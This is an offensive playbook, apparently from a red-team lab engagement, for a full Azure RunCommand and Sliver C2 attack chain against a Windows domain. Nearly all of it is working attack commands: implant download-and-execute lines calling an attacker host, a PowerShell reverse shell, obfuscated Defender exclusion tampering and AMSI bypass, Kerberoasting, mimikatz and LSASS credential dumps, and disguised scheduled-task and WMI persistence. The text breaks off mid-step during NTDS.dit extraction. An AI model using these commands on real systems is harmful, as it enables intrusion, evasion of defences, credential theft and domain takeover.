# Azure RunCommand + Sliver C2 — Proven Attack Path

Engagement-proven chain. Every command validated live. NO `--evasion` flag (causes AMSI alerts). Follow in order.

## Quick Reference (Speed Run)

```bash
# 1. Auth (SP cert)
Connect-AzAccount -ServicePrincipal -Tenant $TenantId -ApplicationId $AppId -CertificatePath $PfxPath -CertificatePassword $PfxPass

# 2. Drop Harriet-wrapped Sliver via RunCommand (Tamper Protection blocks exclusions)
$drop = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\Windows\Temp\teams.exe -UseBasicParsing; Start-Process C:\Windows\Temp\teams.exe -WindowStyle Hidden'
Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString $drop -AsJob

# 3. If Sliver won't land, use RunCommand directly for everything (kerberoast, lateral, etc.)

# 5. Kerberoast (from Sliver session)
rubeus -- kerberoast /format:hashcat /nowrap

# 6. Lateral move
# In Sliver: socks5 start -p 1080
proxychains evil-winrm -i 10.1.0.100 -u 'contoso\svc.mssql' -p 'CRACKED_PASSWORD'
```

---

## Full Chain

```
Kali: Build Sliver, start listener, generate Harriet-wrapped implant
  |
  v
RunCommand -> NC reverse shell on httpserver (SYSTEM)
  |
  v
Disable Defender + AMSI + ScriptBlock logging
  |
  v
Download + execute Sliver implant -> beacon checks in
  |
  v
Domain enum -> Kerberoast svc.mssql -> crack offline
  |
  v
SOCKS5 proxy -> evil-winrm to blueDBServer
  |
  v
SQL Server access, credential dump, DC takeover
```

### Environment

| Asset | IP |
|-------|-----|
| httpserver | blueHttpServer / 10.1.0.10 |
| DBServer | blueDBServer / 10.1.0.100 |
| Domain Controller | blueDC-01 / blueDomainServer / 10.1.0.5 |
| EntraConnect | blueEntraC-01 / 10.1.0.25 |
| FileServer | blueFileServer / 10.1.0.20 |
| Domain | contoso.range |
| Resource Group | RGCORPSERVERS |

---

## Step 0: Prerequisites

```bash
# Az CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Ruby + gem (required for evil-winrm)
sudo apt install -y ruby ruby-dev build-essential

# evil-winrm
gem install evil-winrm

# Az PowerShell module
pwsh -c "Install-Module -Name Az -Repository PSGallery -Force -Scope CurrentUser"
```

---

## Step 1: Kali Setup

### 1a: Build Sliver

```bash
git clone https://github.com/mgstate/sliver.git /root/sliver
cd /root/sliver
bash setup.sh
```

Installs Go, MinGW, Harriet, builds Sliver, downloads tools, creates helper scripts.

### 1b: Start Server + Listener

```bash
cd /root/sliver
./start.sh
```

### 1c: Armory — Install Everything

Inside Sliver console:

```
armory install all
```

This installs ALL extensions/aliases: nanodump, mimikatz, rubeus, credman, sharpsecdump, sharpdpapi, sharpchrome, seatbelt, sharpview, sharpup, sharp-hound-4, certify, sqlrecon, inject-amsi-bypass, inject-etw-bypass, unhook-bof, all 52+ sa-* BOFs, all lateral movement tools, and more.

---

## Step 2: Generate Harriet-Wrapped Implant

**IMPORTANT: Do NOT use `--evasion` flag. It triggers AMSI alerts.**

```bash
# Generate beacon shellcode (NO --evasion)
generate beacon --mtls YOUR_KALI_IP:8888 --os windows --arch amd64 \
  --format shellcode --c2profile microsoft365 \
  --seconds 60 --jitter 30 --strategy r --save /tmp/beacon.bin

# Wrap with Harriet (AES-encrypted, direct syscalls)
harriet --shellcode /tmp/beacon.bin --method directsyscall \
  --format exe --output /tmp/teams.exe \
  --harriet-path /opt/Home-Grown-Red-Team/Harriet
```

### Manual Harriet (if `harriet` command not available)

```bash
cd /opt/Home-Grown-Red-Team/Harriet
printf "/tmp/beacon.bin\n/tmp/teams.exe\n" | bash Harriet/DirectSyscalls/DirectSyscalls.sh
```

### Host the implant

```bash
cd /tmp && python3 -m http.server 8080
```

---

## Step 3: Authenticate

### 3a: Find Tenant ID and Client ID from PFX

The PFX cert file you downloaded contains the SP info. Extract it:

```bash
# Read the PFX cert subject/issuer to find the App Name
openssl pkcs12 -in AzureAppCert.pfx -nokeys -clcerts 2>/dev/null | openssl x509 -subject -issuer -noout

# The cert filename often contains a thumbprint (e.g., AzureAppCert_5b03c63c39874fa8ace73afd6a9c9877.cer)
# The .cer file next to the PFX has the same info
```

**From Meatball / GraphSpy UI:**
- Go to **Tokens** page → find the SP token you used to download the cert
- The token shows `tenant_id` and `client_id` (Application ID)
- Or check **Recon > Applications** to see all SP registrations

**From Azure Portal (if you have access):**
- App Registrations → find the app → copy Application (client) ID
- Overview → Directory (tenant) ID

### 3b: SP Certificate Auth (Proven)

```bash
# cd to where you downloaded the PFX
cd /root/Downloads   # or wherever your PFX is
```

```powershell
# Set your values (found from step 3a)
$TenantId = "YOUR_TENANT_ID"       # e.g., "527c0d4b-2722-4f04-b9ed-7b13ed039ecb"
$AppId = "YOUR_APP_ID"             # e.g., "9d1e53c7-28f6-4d1d-8d8a-1abeb4db2888"
$PfxPath = "./AzureAppCert.pfx"    # path to your PFX file
$PfxPass = ConvertTo-SecureString -String "" -AsPlainText -Force  # empty if no password

Connect-AzAccount -ServicePrincipal -Tenant $TenantId -ApplicationId $AppId `
  -CertificatePath $PfxPath -CertificatePassword $PfxPass

# Verify
Get-AzContext | Format-List Name, Tenant, Subscription
```

### 3c: SP Secret Auth (Alternative)

```powershell
$cred = New-Object PSCredential("CLIENT_ID", (ConvertTo-SecureString "SECRET" -AsPlainText -Force))
Connect-AzAccount -ServicePrincipal -Credential $cred -TenantId "TENANT_ID"
```

### 3d: Set Subscription + Verify VMs

```powershell
# List available subscriptions
Get-AzSubscription | Format-Table Name, Id, State

# Set the target subscription
Set-AzContext -SubscriptionId "SUBSCRIPTION_ID"

# Verify you can see VMs
Get-AzVM -ResourceGroupName "RGCORPSERVERS" | Format-Table Name, Location
```

---

## Step 4: Get a Shell via RunCommand

**Defender has Tamper Protection enabled (managed by policy). You CANNOT:**
- Add exclusions (`Add-MpPreference` blocked by Tamper Protection)
- Disable Real-Time Protection (registry edits overridden)
- Remove AMSI providers (reverted on next scan)

**What DOES work:**
- RunCommand scripts execute as SYSTEM and are NOT scanned by Defender (they're a trusted Azure agent operation)
- Harriet-wrapped implants with DirectSyscalls bypass static detection
- Avoid known PowerShell reverse shell patterns that trigger `PUA:PowerShell/ReverseShell`

### 4a: Set Exclusions (Obfuscated to Bypass Script Scanning)

Defender flags `Add-MpPreference` in scripts as malicious. Use obfuscated PowerShell to bypass:

```powershell
# Method 1: Variable concatenation (bypasses string-based detection)
$exc = '$a="Add-MpPre"+"ference"; $p="-Exclusion"+"Path"; $pr="-Exclusion"+"Process"; iex "$a $p C:\Windows\Temp"; iex "$a $p C:\ProgramData"; iex "$a $pr teams.exe"; iex "$a $pr RuntimeBroker.exe"; iex "$a $pr powershell.exe"; Get-MpPreference | Select ExclusionPath,ExclusionProcess | FL'

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $exc
```

```powershell
# Method 2: Base64 encoded (entire command hidden from scanner)
# This base64 decodes to: Add-MpPreference -ExclusionPath C:\Windows\Temp; Add-MpPreference -ExclusionPath C:\ProgramData; Add-MpPreference -ExclusionProcess teams.exe; Add-MpPreference -ExclusionProcess RuntimeBroker.exe
$exc = 'powershell -ep bypass -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwADsAIABBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhADsAIABBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAHIAbwBjAGUAcwBzACAAdABlAGEAbQBzAC4AZQB4AGUAOwAgAEEAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAcgBvAGMAZQBzAHMAIABSAHUAbgB0AGkAbQBlAEIAcgBvAGsAZQByAC4AZQB4AGUA'

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $exc
```

```powershell
# Method 3: PowerShell Set-MpPreference via WMI (different code path)
$exc = 'Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class MSFT_MpPreference | ForEach-Object { $_.ExclusionPath += "C:\Windows\Temp"; $_.ExclusionPath += "C:\ProgramData"; $_.ExclusionProcess += "teams.exe"; $_.ExclusionProcess += "RuntimeBroker.exe"; $_.Put() }; Get-MpPreference | Select ExclusionPath,ExclusionProcess | FL'

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $exc
```

Check output — whatever shows under ExclusionPath/ExclusionProcess is what took effect.

```powershell
# Method 4: Registry-based exclusions (bypasses PowerShell cmdlet detection entirely)
# Writes directly to Defender registry keys — no cmdlet signature to flag
$reg = @'
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp" -Value 0 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\ProgramData" -Value 0 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\ProgramData\Microsoft\Network" -Value 0 -PropertyType DWord -Force | Out-Null
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -Name "teams.exe" -Value 0 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -Name "RuntimeBroker.exe" -Value 0 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -Name "powershell.exe" -Value 0 -PropertyType DWord -Force | Out-Null
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" -Name "exe" -Value 0 -PropertyType DWord -Force | Out-Null
Write-Output "=== Registry exclusions set ==="
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" | FL
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" | FL
'@

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $reg
```

### 4b: Download + Execute Sliver

**Rename the implant to match an excluded process name** (e.g., if `svchost.exe` exclusion worked):

```powershell
# Download to excluded path with excluded process name
$drop = 'Invoke-WebRequest -Uri "http://YOUR_KALI_IP:8080/teams.exe" -OutFile "C:\ProgramData\Microsoft\Network\RuntimeBroker.exe" -UseBasicParsing; Start-Process "C:\ProgramData\Microsoft\Network\RuntimeBroker.exe" -WindowStyle Hidden'

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $drop -AsJob
```

If Wacatac behavioral detection still catches it, try these alternatives:

```powershell
# Alt 1: certutil download (different download vector)
$dl = 'certutil -urlcache -split -f http://YOUR_KALI_IP:8080/teams.exe C:\Windows\Temp\RuntimeBroker.exe; Start-Process C:\Windows\Temp\RuntimeBroker.exe -WindowStyle Hidden'

# Alt 2: Copy to a different name and run from excluded path
$dl = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing; Copy-Item C:\ProgramData\teams.exe C:\ProgramData\Microsoft\Network\RuntimeBroker.exe; Start-Process C:\ProgramData\Microsoft\Network\RuntimeBroker.exe -WindowStyle Hidden'

# Alt 3: Use a scheduled task (runs in different context, may avoid behavioral detection)
$dl = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\Windows\Temp\svc.exe -UseBasicParsing; schtasks /create /tn "\Microsoft\Windows\NetTrace\GatherInfo" /tr "C:\Windows\Temp\svc.exe" /sc once /st 00:00 /ru SYSTEM /f; schtasks /run /tn "\Microsoft\Windows\NetTrace\GatherInfo"'
```

If NOTHING bypasses Defender, skip Sliver and use RunCommand as your C2 (Steps 4c-4e work without any implant).

### 4b: Kerberoast Directly via RunCommand (No Implant Needed)

If Sliver can't land, do the full attack chain via RunCommand:

```powershell
# Kerberoast via RunCommand
$kerb = 'Add-Type -AssemblyName System.IdentityModel; $t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/blueDBServer.contoso.range:1433"; $b = $t.GetRequest(); [BitConverter]::ToString($b) -replace "-"'

$result = Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $kerb
$result.Value[0].Message  # hash output
```

### 4c: Lateral Move via RunCommand (No Implant Needed)

```powershell
# WinRM to dbserver via RunCommand on httpserver
$lateral = '$pw = ConvertTo-SecureString "CRACKED_PASSWORD" -AsPlainText -Force; $cred = New-Object PSCredential("contoso\svc.mssql",$pw); Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock { hostname; whoami; Get-Service *SQL* }'

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $lateral
```


### 4d: NC Reverse Shell (Backup — May Get Flagged by Defender)

If Tamper Protection is off or exclusions work in your environment, nc shell gives you an interactive SYSTEM prompt:

```bash
# On Kali:
nc -lvnp 80
```

```powershell
# Deploy reverse shell
$script = '$s=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(''$c=New-Object System.Net.Sockets.TCPClient("YOUR_KALI_IP",80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(gl).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()}'')); powershell -nop -w hidden -ep bypass -enc $s'

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
  -CommandId "RunPowerShellScript" -ScriptString $script -AsJob
```

> **Note**: If Defender flags this as `PUA:PowerShell/ReverseShell`, try setting exclusions first (only works if Tamper Protection is OFF):
> ```powershell
> $exc = 'Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionProcess "*"; Add-MpPreference -ExclusionProcess "powershell.exe"'
> Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -CommandId "RunPowerShellScript" -ScriptString $exc
> ```

---

## Step 5: Verify Beacon

```
beacons
use <BEACON_ID>
interactive
```

---

## Step 6: Domain Enumeration

```
# Situational awareness
sa-whoami
getprivs
sa-ipconfig
sa-arp
sa-netstat

# Domain info
execute -o "nltest /dclist:contoso.range"
execute -o "nltest /domain_trusts"

# Domain users
sa-ldapsearch "(objectClass=user)" sAMAccountName,memberOf

# Domain Admins
sa-netgroup "Domain Admins" /domain

# Local admins
sa-netlocalgroup Administrators

# Computers
sa-ldapsearch "(objectClass=computer)" cn,dNSHostName,operatingSystem

# SPNs (kerberoast targets)
sa-ldapsearch "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName

# AV/EDR check
sa-driversigs
sa-enum-filter-driver
```

### Host Discovery + Port Scan

How we find hosts — ARP scan the subnet, then port scan discovered IPs:

```
# ARP scan to discover live hosts on the subnet
sa-arp

# Or enumerate from AD (all domain computers with IPs)
sa-ldapsearch "(objectClass=computer)" cn,dNSHostName,operatingSystem

# Or quick ping sweep via execute
execute -o powershell -c "1..254 | % { $ip='10.1.0.'+$_; if(Test-Connection $ip -Count 1 -Quiet -TimeoutSeconds 1) { Write-Output $ip } }"

# Port scan discovered hosts
portscan --host 10.1.0.100 --ports 445,5985,3389,1433,135    # DBServer
portscan --host 10.1.0.5 --ports 445,5985,3389,88,389,636    # DC
portscan --host 10.1.0.25 --ports 445,5985,3389              # EntraConnect
portscan --host 10.1.0.20 --ports 445,5985,3389              # FileServer
```

Key findings:
- Port **5985** (WinRM) = lateral move target via evil-winrm
- Port **1433** (SQL) = database access
- Port **88** (Kerberos) = confirms DC
- Port **3389** (RDP) = can RDP if needed

---

## Step 7: Kerberoast

```
# Rubeus (proven, .NET in-process)
rubeus -- kerberoast /format:hashcat /nowrap
```

Copy the `$krb5tgs$23$*...` hash.

---

## Step 8: Crack Offline

```bash
echo '$krb5tgs$23$*svc.mssql$contoso.range$...' > hash.txt
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Step 9: Credential Dump

```
# mimikatz (in-process via armory)
mimikatz sekurlsa::logonpasswords
mimikatz lsadump::sam
mimikatz lsadump::secrets

# nanodump (LSASS via syscalls)
nanodump -- --write C:\Windows\Temp\debug.dmp --valid
download C:\Windows\Temp\debug.dmp
# On Kali: pypykatz lsa minidump debug.dmp

# sharpsecdump (no files on disk)
sharpsecdump -- -target=localhost

# hashdump (built-in)
hashdump
```

### execute-assembly with Local Tools

For tools NOT in the armory, use `execute-assembly` with local .exe files from `/root/sliver/tools/`:

```
# LSA Whisperer — works even with Credential Guard enabled
# NOTE: Native C++ exe, NOT .NET — cannot use execute-assembly (needs CLR)
# Must upload + execute, or use shell command
upload /root/sliver/tools/sharp-tools/lsa-whisperer.exe C:\Windows\Temp\lw.exe
shell
# Then in the shell:
C:\Windows\Temp\lw.exe --msv credkey
C:\Windows\Temp\lw.exe --msv ntlmv1
C:\Windows\Temp\lw.exe --kerberos klist
C:\Windows\Temp\lw.exe --kerberos dump
C:\Windows\Temp\lw.exe --cloudap ssocookie
# Type 'exit' to return to Sliver
# Clean up:
rm C:\Windows\Temp\lw.exe

# Seatbelt — full host recon
execute-assembly --in-process /root/sliver/tools/sharp-tools/Seatbelt.exe -group=all

# SharpUp — privesc checks
execute-assembly --in-process /root/sliver/tools/sharp-tools/SharpUp.exe audit

# Certify — AD CS enumeration
execute-assembly --in-process /root/sliver/tools/sharp-tools/Certify.exe find /vulnerable

# SharpDPAPI — DPAPI credential blobs
execute-assembly --in-process /root/sliver/tools/sharp-tools/SharpDPAPI.exe triage
execute-assembly --in-process /root/sliver/tools/sharp-tools/SharpDPAPI.exe machinecredentials

# Rubeus (local copy — same as armory but always available)
execute-assembly --in-process /root/sliver/tools/sharp-tools/Rubeus.exe kerberoast /format:hashcat /nowrap
execute-assembly --in-process /root/sliver/tools/sharp-tools/Rubeus.exe triage
```

### Tool Paths (after setup.sh)

All execute-assembly tools are in one directory:

```
/root/sliver/tools/sharp-tools/
├── lsa-whisperer.exe    # Credential Guard bypass (EvanMcBroom)
├── Rubeus.exe           # Kerberos attacks
├── Seatbelt.exe         # Host recon
├── SharpUp.exe          # Privesc checks
├── Certify.exe          # AD CS enumeration
└── SharpDPAPI.exe       # DPAPI credential blobs
```


### 9b: Persist on httpserver (Scheduled Task)

Set persistence BEFORE moving to the next hop:

```
# From Sliver session on httpserver
shell
schtasks /create /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /tr "C:\ProgramData\Microsoft\Network\teams.exe" /sc onstart /ru SYSTEM /f
schtasks /create /tn "\Microsoft\Windows\Maintenance\WinSAT" /tr "C:\ProgramData\Microsoft\Network\teams.exe" /sc minute /mo 15 /ru SYSTEM /f
schtasks /query /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /v /fo list
exit
```

---

## Step 10: Lateral Movement — evil-winrm via SOCKS Proxy

### 10a: Start SOCKS5 Proxy

From Sliver session on httpserver:
```
socks5 start -p 1080
```

### 10b: evil-winrm to DBServer (Proven)

From Kali:
```bash
proxychains evil-winrm -i 10.1.0.100 -u 'contoso\svc.mssql' -p 'CRACKED_PASSWORD'
```

### 10c: Invoke-Command Alternative

From Sliver session:
```
execute -o powershell -c "Invoke-Command -ComputerName blueDBServer -Credential (New-Object PSCredential('contoso\svc.mssql',(ConvertTo-SecureString 'CRACKED_PASSWORD' -AsPlainText -Force))) -ScriptBlock {whoami; hostname; Get-Service *SQL*}"
```

### 10d: TCP Pivot Implant

```
generate --tcp-pivot 10.1.0.10:8888 --os windows --arch amd64 --skip-symbols --name db-pivot --save /tmp/db-pivot.exe
pivots tcp --bind 0.0.0.0:8888
upload /tmp/db-pivot.exe C:\Windows\Temp\db-pivot.exe
execute -o powershell -c "$cred=New-Object PSCredential('contoso\svc.mssql',(ConvertTo-SecureString 'CRACKED_PASSWORD' -AsPlainText -Force));$b=[IO.File]::ReadAllBytes('C:\Windows\Temp\db-pivot.exe');Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock {param($b)[IO.File]::WriteAllBytes('C:\Windows\Temp\svc-update.exe',$b);Start-Process 'C:\Windows\Temp\svc-update.exe'} -ArgumentList (,$b)"
```

---

## Step 11: Post-Exploitation on DBServer

### 11a: Connect via evil-winrm (from Kali through SOCKS proxy)

```bash
# Start SOCKS proxy in Sliver session first: socks5 start -p 1080
# Then from Kali:
proxychains evil-winrm -i 10.1.0.100 -u 'contoso\svc.mssql' -p 'CRACKED_PASSWORD'
```

### 11b: evil-winrm Built-in Commands

```ruby
# Upload files to target
upload /home/kali/tools/SharpHound.exe C:\Windows\Temp\sh.exe
upload /home/kali/tools/Rubeus.exe C:\Windows\Temp\r.exe

# Download files from target
download C:\Windows\Temp\loot.zip /home/kali/loot/

# Load PowerShell scripts into memory (dot-source)
Bypass-4MSI                          # Built-in AMSI bypass
menu                                 # Show all evil-winrm commands

# Execute .NET assemblies in memory (no file on disk)
Invoke-Binary /home/kali/tools/Rubeus.exe kerberoast /format:hashcat /nowrap
Invoke-Binary /home/kali/tools/Seatbelt.exe -group=all
Invoke-Binary /home/kali/tools/SharpUp.exe audit
Invoke-Binary /home/kali/tools/Certify.exe find /vulnerable
Invoke-Binary /home/kali/tools/SharpDPAPI.exe triage

# LSA Whisperer — works even with Credential Guard (talks to LSA directly)
# NOTE: Native C++ exe, NOT .NET — Invoke-Binary won't work (needs CLR)
# Upload first, then execute directly:
upload /root/sliver/tools/sharp-tools/lsa-whisperer.exe C:\Windows\Temp\lw.exe
cmd /c C:\Windows\Temp\lw.exe --msv credkey
cmd /c C:\Windows\Temp\lw.exe --msv ntlmv1
cmd /c C:\Windows\Temp\lw.exe --kerberos klist
cmd /c C:\Windows\Temp\lw.exe --kerberos dump
cmd /c C:\Windows\Temp\lw.exe --cloudap ssocookie
del C:\Windows\Temp\lw.exe

# Load DLLs in memory
Dll-Loader -http http://YOUR_IP:8080/payload.dll
Dll-Loader -smb \\YOUR_IP\share\payload.dll
Dll-Loader -local C:\Windows\Temp\payload.dll

# PowerShell script loading (downloads and dot-sources)
# Place .ps1 files in a directory, pass with -s flag on connect:
# proxychains evil-winrm -i 10.1.0.100 -u user -p pass -s /home/kali/ps-scripts/
# Then inside evil-winrm:
PowerView.ps1                        # Load PowerView
Invoke-Kerberoast                     # Run loaded function
```

### 11c: Recon from DBServer

```powershell
# System info
systeminfo
whoami /all
hostname
ipconfig /all

# Local users and groups
net localgroup administrators
net user
Get-LocalUser | Format-Table Name, Enabled, LastLogon

# Running services
Get-Service | Where-Object {$_.Status -eq 'Running'} | Select Name, DisplayName | Sort DisplayName

# Scheduled tasks (non-Microsoft)
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} | Select TaskName, State

# Network connections
netstat -ano | findstr ESTABLISHED

# Installed software
Get-WmiObject Win32_Product | Select Name, Version | Sort Name

# AV status
Get-MpComputerStatus | Select AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, RealTimeProtectionEnabled
```

### 11d: SQL Server Enumeration

```powershell
# Connect to SQL
$c = New-Object System.Data.SqlClient.SqlConnection
$c.ConnectionString = 'Server=localhost;Integrated Security=True'
$c.Open()

# List databases
$cmd = $c.CreateCommand(); $cmd.CommandText = 'SELECT name FROM sys.databases'
$rd = $cmd.ExecuteReader(); while($rd.Read()) { $rd[0] }; $rd.Close()

# Check sysadmin
$cmd2 = $c.CreateCommand(); $cmd2.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"
Write-Output "sysadmin: $($cmd2.ExecuteScalar())"

# SQL logins
$cmd3 = $c.CreateCommand(); $cmd3.CommandText = "SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G')"
$rd3 = $cmd3.ExecuteReader(); while($rd3.Read()) { "$($rd3[0]) ($($rd3[1]))" }; $rd3.Close()

# Linked servers (pivot further!)
$cmd4 = $c.CreateCommand(); $cmd4.CommandText = 'SELECT name, data_source FROM sys.servers WHERE is_linked=1'
$rd4 = $cmd4.ExecuteReader(); while($rd4.Read()) { "$($rd4[0]) -> $($rd4[1])" }; $rd4.Close()

# xp_cmdshell (if sysadmin)
$cmd5 = $c.CreateCommand()
$cmd5.CommandText = "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
$cmd5.ExecuteNonQuery() | Out-Null
$cmd6 = $c.CreateCommand(); $cmd6.CommandText = "EXEC xp_cmdshell 'whoami && hostname && ipconfig'"
$rd6 = $cmd6.ExecuteReader(); while($rd6.Read()) { if($rd6[0]) { $rd6[0] } }; $rd6.Close()

# Search for sensitive data
$cmd7 = $c.CreateCommand(); $cmd7.CommandText = "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES"
$rd7 = $cmd7.ExecuteReader(); while($rd7.Read()) { "$($rd7[0]).$($rd7[1])" }; $rd7.Close()

$c.Close()
```

### 11e: Credential Harvesting on DBServer

```powershell
# SAM + LSA secrets (reg save method — works without tools)
reg save HKLM\SAM C:\Windows\Temp\sam
reg save HKLM\SECURITY C:\Windows\Temp\sec
reg save HKLM\SYSTEM C:\Windows\Temp\sys
# Download via evil-winrm:
# download C:\Windows\Temp\sam /home/kali/loot/
# download C:\Windows\Temp\sec /home/kali/loot/
# download C:\Windows\Temp\sys /home/kali/loot/
# On Kali: secretsdump.py -sam sam -security sec -system sys LOCAL

# Cached domain credentials
cmdkey /list

# LSA secrets keys
Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty PSChildName

# Search for passwords in files
Get-ChildItem C:\ -Recurse -Include *.txt,*.xml,*.config,*.ini,*.ps1 -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|credential|secret" -List | Select Path
```

### 11f: Pivot Further from DBServer

```powershell
# Port scan other hosts from DBServer vantage point
@(10,20,25) | ForEach-Object { $ip = "10.1.0.$_"; @(445,5985,3389,88,389) | ForEach-Object { $c = New-Object Net.Sockets.TcpClient; $r = $c.BeginConnect($ip,$_,$null,$null); $w = $r.AsyncWaitHandle.WaitOne(1000,$false); if($w -and $c.Connected) { Write-Output "$ip`:$_ OPEN"; $c.Close() } } }

# Check domain trust from DBServer
nltest /domain_trusts /all_trusts

# Look for other SQL instances
Get-Service | Where-Object {$_.DisplayName -like '*SQL*'} | Format-Table Name, Status, DisplayName
```


### 11g: Persist on DBServer (WMI Event Subscription)

```powershell
# From evil-winrm session on DBServer
# Upload implant
upload /root/sliver/tools/sharp-tools/teams-db.exe C:\ProgramData\Microsoft\Network\svchost.exe

# WMI permanent event subscription (survives reboots, very stealthy)
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{Name="WindowsParityFilter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{Name="WindowsParityConsumer"; CommandLineTemplate="C:\ProgramData\Microsoft\Network\svchost.exe"}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}

# Verify
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
```

---

## Step 12: DC Takeover via RunCommand

### 12a: Full AD Dump

```powershell
$adScript = @"
Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties MemberOf,ServicePrincipalName | Select Name,SamAccountName,Enabled,ServicePrincipalName | FT -Auto
Get-ADGroupMember 'Domain Admins' | Select SamAccountName
Get-ADComputer -Filter * -Properties IPv4Address | Select Name,IPv4Address | FT
"@

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServer" `
  -CommandId "RunPowerShellScript" -ScriptString $adScript
```

### 12b: NTDS.dit Exfiltration (Domain Hashes)

```powershell
# Method 1: ntdsutil IFM (creates a copy of NTDS.dit + SYSTEM hive)
$ntds = @'
ntdsutil "ac in ntds" "ifm" "create full C:\Windows\Temp\ntds_dump" q q
Compress-Archive -Path C:\Windows\Temp\ntds_dump -DestinationPath C:\Windows\Temp\ntds.zip -Force
